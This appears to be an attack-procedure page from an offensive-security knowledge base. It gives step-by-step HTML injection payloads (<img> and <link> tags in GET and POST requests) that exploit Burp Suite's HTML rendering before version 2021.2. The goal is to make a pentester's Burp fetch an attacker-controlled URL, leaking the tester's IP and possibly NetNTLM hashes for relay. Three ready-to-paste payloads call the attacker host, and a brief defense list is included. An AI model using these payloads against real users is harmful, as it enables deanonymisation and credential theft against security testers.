---
id: proc-craft-html-injection-request
tags:
  - html-injection
  - payload-craft
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/GET-Request-with-IMG-Tag-Injection]]'
  - '[[commands/POST-Request-with-LINK-Tag-Injection]]'
  - '[[commands/Minimal-GET-Parameter-Injection]]'
verified: false
platforms:
  - Web
  - Desktop
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T17:26:56.396Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---
# Craft-Malicious-HTTP-Request-with-HTML-Injection

## Summary

This procedure crafts HTTP requests with embedded HTML injection payloads, such as <img> or <link> tags pointing to attacker-controlled URLs, to exploit Burp Suite's rendering and trigger unsolicited fetches for IP leaks or further exploitation.

## Description

In the attack scenario, the attacker prepares legitimate-looking HTTP requests (GET or POST) that include malicious HTML in query parameters or bodies. When viewed or modified in Burp Suite's Proxy, HTTP history, or Repeater, the Swing HTML renderer parses and executes the tags, fetching external resources without proxy mediation. This targets pentesters using Burp, leading to IP disclosure, NetNTLM hash leaks via file:// SMB triggers, NTLM relay RCE, or DoS. Prerequisites include access to an attacker server and knowledge of the victim's Burp usage.

## Requirements

1. Attacker-controlled server (e.g., http://www.rec2.ml) to host leak endpoints
2. Basic HTTP request crafting skills
3. Target victim using vulnerable Burp Suite (pre-2021.2)

## Defense

Defensive measures and detection strategies:

- Update Burp Suite to 2021.2 or later, which sanitizes HTML rendering
- Disable HTML rendering in Burp tabs or use text-only view
- Monitor for anomalous outbound connections from Burp process
- Enable SMB signing on Windows to prevent NTLM relay

## Objectives

1. Inject HTML tags into HTTP requests without breaking structure
2. Prepare payloads for IP leak, hash disclosure, or DoS
3. Ensure compatibility with Burp's rendering tabs

## Instructions

### Step 1: Prepare GET Request Payload

**Context**: Create a GET request injecting <img> tag in query parameter to leak IP via HTTP fetch.

**Command** ([[commands/GET-Request-with-IMG-Tag-Injection]]):
```bash
GET /burpsuite_leak_vuln-leak_impact.html?=<html><img+src='http://www.rec2.ml/leak'> HTTP/1.1
```

> This command crafts a GET request; paste into Burp Repeater. Expected output: Burp fetches http://www.rec2.ml/leak, logging victim IP in server access logs.

### Step 2: Prepare POST Request Payload

**Context**: Use <link> tag in POST body for stylesheet fetch, similar to img for leak.

**Command** ([[commands/POST-Request-with-LINK-Tag-Injection]]):
```bash
POST /burpsuite_leak_vuln-leak_impact.html HTTP/1.1
Content-Type: application/x-www-form-urlencoded

=<html><link+rel='stylesheet'+href='http://www.rec2.ml/leak'>
```

> Paste into Burp; triggers fetch on render. Expected: Hidden HTTP request to attacker URL.

### Step 3: Minimal Parameter Injection

**Context**: Shorter payload for quick testing in GET params.

**Command** ([[commands/Minimal-GET-Parameter-Injection]]):
```bash
?=<html><img+src='http://www.rec2.ml/leak'>
```

> Append to URL in Burp. Expected: Unsolicited img fetch.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Drive-by Compromise]] Drive-by Compromise

### Sub-Techniques


## Commands Used

- [[commands/GET-Request-with-IMG-Tag-Injection]]
- [[commands/POST-Request-with-LINK-Tag-Injection]]
- [[commands/Minimal-GET-Parameter-Injection]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- [[html-injection]]
- [[payload-craft]]
